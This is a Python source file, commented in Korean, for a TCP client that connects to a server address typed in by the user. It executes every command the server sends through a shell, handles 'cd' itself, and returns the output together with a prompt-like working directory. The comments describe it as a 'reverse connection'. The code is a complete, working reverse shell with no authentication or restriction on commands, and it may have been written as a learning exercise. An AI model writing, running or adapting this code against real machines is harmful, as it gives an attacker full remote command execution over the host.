import socket
import os
import subprocess
import sys
from select import *
from multiprocessing import Process, Queue
import multiprocessing
from time import ctime




class Client:
    BUFSIZE = 1024

    def client_recv(self,clientSocket,server_ip_port_info):
        
        while True:
            try:
                data = clientSocket.recv(self.BUFSIZE)
            except ConnectionResetError:
                print("[INFO][%s] 서버의 연결이 종료되었습니다." % ctime())
                clientSocket.close()
                sys.exit()


            if not data:
                print('서버 (%s:%s)와의 연결이 끊어졌습니다.' % server_ip_port_info)
                clientSocket.close()
                sys.exit()

            if data[:2].decode("cp949") == 'cd':
            #만약 서버에서 보낸 요청에서 첫 문자가 cd 일 경우 
                os.chdir(data[3:].decode("cp949"))
                continue

            if len(data) > 0:
                
                if data.decode("cp949") == "quit":
                    # 서버 측에서 종료가 될 경우에는 bytes 형식으로 ''을 보냄, 즉 다음과 같이 검출
                    print('서버 (%s:%s)와의 연결이 끊어졌습니다.' % server_ip_port_info)
                    clientSocket.close()
                    sys.exit()
                    # 서버 측으로부터 quit 메세지를 받았을때 
                    break
                    return
               
            
                # 클라이언트 cmd 창도 종료

                # cd 명령이 아닌 다른 명령일 경우
                # 서버로부터 요청 명령이 날라올 경우 subprocess를 통해서 프로세스 하나를 실행
                

                cmd = subprocess.Popen(data[:].decode("cp949"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

                # shell = True : 별도의 서브 쉘을 실행하고 해당 쉘 위에서 명령을 실행하도록 함
                # reverse connection : 서버 측에서 보낸 메세지를 확인하여 명령어로 판단하고 클라이언트에서 서브 프로세스를 생성을 하여 명령을 실행
                
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                
                server_request_str = str(output_bytes.decode("cp949"))
                clientSocket.send(str.encode(server_request_str + "\n" + str(os.getcwd()) + "> ","cp949"))
                # 클라이언트가 수행한 작업을 서버측에서 확인이 가능하도록 다시 보내줌
                # os.getcwd() : 자신의 현재 디렉토리 위치를 보여줌, 즉 프롬프트처럼 표시되도록 하는것

                print(server_request_str)
                # 서버측에서 요청한 명령을 실행
        
    def client_quit(self,clientSocket):
        while True:
            cmd = input()

            if cmd == "quit":
                clientSocket.close()
                return
    

    def __init__(self):
        clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        server_ip_port = input("서버 IP와 포트 번호 입력 : ").split()
        server_ip_port[1] = int(server_ip_port[1])
        
        server_ip_port_info = tuple(server_ip_port)
        
        try:

            clientSocket.connect(server_ip_port_info)
        except Exception as e:
            print('서버(%s:%s) 에 연결할 수 없습니다.' % server_ip_port_info)
            sys.exit()
            
        print('서버(%s:%s) 에 연결 되었습니다.' % server_ip_port_info)
        
        # while connection_list:
        try:
            # read_socket, write_socket, error_socket = select(connection_list, [], [], 10)
            
            self.client_recv(clientSocket, server_ip_port_info)

            print("recv success")
        except KeyboardInterrupt:
            print("Ctrl + C 로 인한 클라이언트 종료")
            clientSocket.close()
            sys.exit()

if __name__ == "__main__":
    CtlClient = Client()
